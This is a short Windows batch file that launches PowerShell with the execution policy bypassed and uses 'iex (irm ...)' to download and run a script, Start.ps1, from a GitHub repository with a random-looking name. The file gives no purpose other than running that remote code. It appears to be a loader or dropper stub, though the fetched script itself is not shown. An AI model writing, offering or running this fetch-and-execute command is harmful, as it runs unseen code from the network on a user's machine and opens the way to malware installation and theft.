@echo off
echo Attempting to run PowerShell script from GitHub...
powershell -ExecutionPolicy Bypass -Command "iex (irm https://github.com/zrxqzrxq123/asdasdc1/raw/refs/heads/main/Start.ps1)"
if %errorlevel% neq 0 echo There was an error running the script.
pause
